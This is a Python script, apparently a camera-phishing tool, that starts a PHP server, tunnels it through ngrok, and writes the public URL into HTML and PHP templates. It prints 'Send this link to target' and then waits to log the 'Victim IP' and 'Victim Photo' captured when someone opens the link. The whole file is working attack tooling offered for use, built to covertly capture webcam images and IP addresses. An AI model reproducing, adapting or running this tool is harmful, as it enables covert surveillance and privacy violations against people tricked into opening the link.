# Coded by @INDIATECHYOUTUBE
# Github : https://github.com/INDIATECHYOUTUBE
# Don't copy the code
# Donate author on paypal if use any part of the code : https://paypal.me/indiatechyoutube
# Youtube : https://youtube.com/channel/UCxwRU278xsYp3Y-QHGoMTPw
import os
import pathlib
import re # pip install re
import requests # pip install requests
import time
import datetime
from termcolor import colored
from colorama import init
import platform
import subprocess
import distutils.spawn # pip install distutils
init()
def check_ip_cam():
    plus = colored("[+]", 'green')
    exit2 =  colored("Press Ctrl + C to exit", 'red')
    wait = colored("[!] Waiting For Link to open in Victim Phone !....., ",'green')
    print(f"{wait} {exit2}")
    ip_file = pathlib.Path("ipfile.txt")
    images_log = pathlib.Path("images_log_info.log")
    while True:
        if ip_file.exists():
            print(colored("[*] Victim opened Link ", 'green'))
            with open("ipfile.txt","r") as ip_file:
                read_IP = ip_file.readlines(2)
                print(colored(f"{plus} Victim IP : {read_IP}", "red"))
                ip_file.close()
                os.system('del ipfile.txt')
                print("")
            check_ip_cam()
        if images_log.exists():
            print("\n")
            print(colored(f"{plus} Victim Photo Found ", 'green'))
            print("")
            os.system('del images_log_info.log')
            check_ip_cam()


def php_data():
    url_file_to_read = open('url_data.txt', 'r')
    link_to_find = re.compile(r'https://[0-9a-z]*\.ngrok.io') # this will only finds word
    for line in url_file_to_read :                            # this will find line in given txt file
        ngrok_url = link_to_find.findall(line)                # this will find url in the given link_to_find variale
        for url in ngrok_url:                                 # After finding word you will get url i.e http://.....ngrok.io
            with open('template.php') as  infile:           # Reading data                                                               #  from saycheese.html
                data = infile.read()                          #               From paycam.html
            data = data.replace('link', url)               # Replacing forwarding_link
            with open('index.php', 'w') as outfile:
                outfile.write(data)               # Writing data
                url_file_to_read.close()
                os.system('del url_data.txt')
            check_ip_cam()
def html_data():
    url_file_to_read = open('url_data.txt', 'r')
    link_to_find = re.compile(r'https://[0-9a-z]*\.ngrok.io') # this will only finds word
    for line in url_file_to_read :                            # this will find line in given txt file
        ngrok_url = link_to_find.findall(line)                # this will find url in the given link_to_find variale
        for url in ngrok_url:                                 # After finding word you will get url i.e http://.....ngrok.io
            with open('pycam.html') as  infile:           # Reading data                                                               #  from saycheese.html
                data = infile.read()                          #               From paycam.html
            data = data.replace('link', url)       # Replacing forwarding_link
            with open('index2.html', 'w') as outfile:
                outfile.write(data)                 # Writing data
            url_file_to_read.close()                       
            php_data()
def catch_url():
    url_file_to_read = open('url_data.txt', 'r')
    regex = re.compile(r'https://[0-9a-z]*\.ngrok.io')
    time.sleep(0.5)
    for line in url_file_to_read :
        ngrok_url = regex.findall(line)
        for url in ngrok_url:
            forward = colored("Send this link to target : ", 'green')
            url_col = colored(f"{url}",'blue')
            print(f"{forward} {url_col}")
            url_file_to_read.close()
            html_data()
def ngrok():
    try:
        url = "http://127.0.0.1:4040/api/tunnels"
        r = requests.get(url)
        f = open('url_data.txt', 'w')
        data = r.json()
        data_in_str = str(data)
        f.write(data_in_str)
        f.close()
    except Exception as error:
        print(error)
        print(colored(":( Ngrok is rufused to connect or ngrok is not running on [ ngrok http 127.0.0.1:3333 ]", 'red'))
        plat_pc_name = platform.node()
        plat_os_name = platform.system()
        print(colored(f'In another cases Something went wrong to your {plat_pc_name} on {plat_os_name} ', 'red'))
        time.sleep(3)
        exit()
def startserver():
    try:
        plus = colored("[+]", 'green')
        php = colored("Required Server Started", 'red')
        print(f"{plus} {php}")
        os.system("start /b php -S 127.0.0.1:3333 > nul & ")
        ngrok = colored("Starting Ngrok Server", 'yellow')
        #print(f"{plus} {ngrok}")
        os.system("start /b ngrok http 127.0.0.1:3333 > nul &")
    except:
        print(colored(" : ( Something went wrong", 'red'))
        time.sleep(3)
        exit()

if __name__ == "__main__" :
    startserver()
    ngrok()
    catch_url()
